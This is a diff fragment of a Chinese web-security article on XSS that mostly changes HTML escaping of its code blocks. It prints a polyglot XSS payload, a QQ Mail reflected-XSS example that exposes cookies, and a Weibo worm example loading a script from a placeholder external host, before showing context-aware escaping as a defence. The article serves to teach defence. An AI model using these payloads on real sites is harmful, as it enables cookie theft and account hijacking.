-<pre><code class="language-js hljs javascript">jaVasCript:&lt;span class="hljs-comment">/*-/*`/*\`/*'/*"/**/&lt;/span>(&lt;span class="hljs-comment">/* */&lt;/span>oNcliCk=alert() )&lt;span class="hljs-comment">//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e&lt;/span>
+<pre><code class="language-js hljs javascript">jaVasCript:&lt;span class="hljs-comment">/*-/*`/*\`/*'/*"/**/&lt;/span>(&lt;span class="hljs-comment">/* */&lt;/span>oNcliCk=alert() )&lt;span class="hljs-comment">//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!>\x3csVg/&lt;sVg/oNloAd=alert()//>\x3e&lt;/span>
 </code></pre>
 
 它能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 `eval()`、`setTimeout()`、`setInterval()`、`Function()`、`innerHTML`、`document.write()` 等 DOM 型 XSS 漏洞，并且能绕过一些 XSS 过滤器。
@@ -544,8 +544,8 @@ location.href = &lt;span class="hljs-string">'UNTRUSTED'&lt;/span>
 
 用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：
 
-<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>&lt;span class="javascript">
-getTop().location.href=&lt;span class="hljs-string">"/cgi-bin/loginpage?autologin=n&errtype=1&verify=&clientuin=aaa"&lt;/span>+&lt;span class="hljs-string">"&t="&lt;/span>+&lt;span class="hljs-string">"&d=bbbb"&lt;/span>;&lt;span class="hljs-keyword">return&lt;/span> &lt;span class="hljs-literal">false&lt;/span>;&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>&lt;span class="javascript">alert(&lt;span class="hljs-built_in">document&lt;/span>.cookie)&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>"+"...
+<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>>&lt;/span>&lt;span class="javascript">
+getTop().location.href=&lt;span class="hljs-string">"/cgi-bin/loginpage?autologin=n&errtype=1&verify=&clientuin=aaa"&lt;/span>+&lt;span class="hljs-string">"&t="&lt;/span>+&lt;span class="hljs-string">"&d=bbbb"&lt;/span>;&lt;span class="hljs-keyword">return&lt;/span> &lt;span class="hljs-literal">false&lt;/span>;&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>>&lt;/span>&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>>&lt;/span>&lt;span class="javascript">alert(&lt;span class="hljs-built_in">document&lt;/span>.cookie)&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>>&lt;/span>"+"...
 </code></pre>
 
 [浏览器](https://www.w3cdoc.com)接收到响应后就会执行 `alert(document.cookie)`，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。
@@ -560,7 +560,7 @@ getTop().location.href=&lt;span class="hljs-string">"/cgi-bin/loginpage?autologi
 
 用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：
 
-<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">li&lt;/span>&gt;&lt;/span>&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"http://weibo.com/pub/star/g/xyyyd"&lt;/span>&gt;&lt;/span>&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span> &lt;span class="hljs-attr">src&lt;/span>=&lt;span class="hljs-string">//xxxx.cn/image/t.js&lt;/span>&gt;&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>"&gt;按分类检索&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">a&lt;/span>&gt;&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">li&lt;/span>&gt;&lt;/span>
+<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">li&lt;/span>>&lt;/span>&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"http://weibo.com/pub/star/g/xyyyd"&lt;/span>>&lt;/span>&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span> &lt;span class="hljs-attr">src&lt;/span>=&lt;span class="hljs-string">//xxxx.cn/image/t.js&lt;/span>>&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>>&lt;/span>">按分类检索&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">a&lt;/span>>&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">li&lt;/span>>&lt;/span>
 </code></pre>
 
 [浏览器](https://www.w3cdoc.com)接收到响应后就会加载执行恶意脚本 `//xxxx.cn/image/t.js`，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。
@@ -583,28 +583,28 @@ getTop().location.href=&lt;span class="hljs-string">"/cgi-bin/loginpage?autologi
 
 在一个支持 Automatic Context-Aware Escaping 的模板引擎里，业务 RD 可以这样定义模板，而无需手动实施转义规则：
 
-<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">html&lt;/span>&gt;&lt;/span>
-  &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">head&lt;/span>&gt;&lt;/span>
-    &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">meta&lt;/span> &lt;span class="hljs-attr">charset&lt;/span>=&lt;span class="hljs-string">"UTF-8"&lt;/span>&gt;&lt;/span>
-    &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">title&lt;/span>&gt;&lt;/span>{{.title}}&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">title&lt;/span>&gt;&lt;/span>
-  &lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">head&lt;/span>&gt;&lt;/span>
-  &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">body&lt;/span>&gt;&lt;/span>
-    &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"{{.url}}"&lt;/span>&gt;&lt;/span>{{.content}}&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">a&lt;/span>&gt;&lt;/span>
-  &lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">body&lt;/span>&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">html&lt;/span>&gt;&lt;/span>
+<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">html&lt;/span>>&lt;/span>
+  &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">head&lt;/span>>&lt;/span>
+    &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">meta&lt;/span> &lt;span class="hljs-attr">charset&lt;/span>=&lt;span class="hljs-string">"UTF-8"&lt;/span>>&lt;/span>
+    &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">title&lt;/span>>&lt;/span>{{.title}}&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">title&lt;/span>>&lt;/span>
+  &lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">head&lt;/span>>&lt;/span>
+  &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">body&lt;/span>>&lt;/span>
+    &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"{{.url}}"&lt;/span>>&lt;/span>{{.content}}&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">a&lt;/span>>&lt;/span>
+  &lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">body&lt;/span>>&lt;/span>
+&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">html&lt;/span>>&lt;/span>
 </code></pre>
 
 模板引擎经过解析后，得知三个插入点所处的上下文，自动选用相应的转义规则：
 
-<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">html&lt;/span>&gt;&lt;/span>
-  &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">head&lt;/span>&gt;&lt;/span>
-    &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">meta&lt;/span> &lt;span class="hljs-attr">charset&lt;/span>=&lt;span class="hljs-string">"UTF-8"&lt;/span>&gt;&lt;/span>
-    &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">title&lt;/span>&gt;&lt;/span>{{.title | htmlescaper}}&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">title&lt;/span>&gt;&lt;/span>
-  &lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">head&lt;/span>&gt;&lt;/span>
-  &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">body&lt;/span>&gt;&lt;/span>
-    &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"{{.url | urlescaper | attrescaper}}"&lt;/span>&gt;&lt;/span>{{.content | htmlescaper}}&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">a&lt;/span>&gt;&lt;/span>
-  &lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">body&lt;/span>&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">html&lt;/span>&gt;&lt;/span>
+<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">html&lt;/span>>&lt;/span>
+  &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">head&lt;/span>>&lt;/span>
+    &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">meta&lt;/span> &lt;span class="hljs-attr">charset&lt;/span>=&lt;span class="hljs-string">"UTF-8"&lt;/span>>&lt;/span>
+    &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">title&lt;/span>>&lt;/span>{{.title | htmlescaper}}&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">title&lt;/span>>&lt;/span>
+  &lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">head&lt;/span>>&lt;/span>
+  &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">body&lt;/span>>&lt;/span>
+    &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"{{.url | urlescaper | attrescaper}}"&lt;/span>>&lt;/span>{{.content | htmlescaper}}&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">a&lt;/span>>&lt;/span>
+  &lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">body&lt;/span>>&lt;/span>
+&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">html&lt;/span>>&lt;/span>
 </code></pre>
 
 目前已经支持 Automatic Context-Aware Escaping 的模板引擎有：
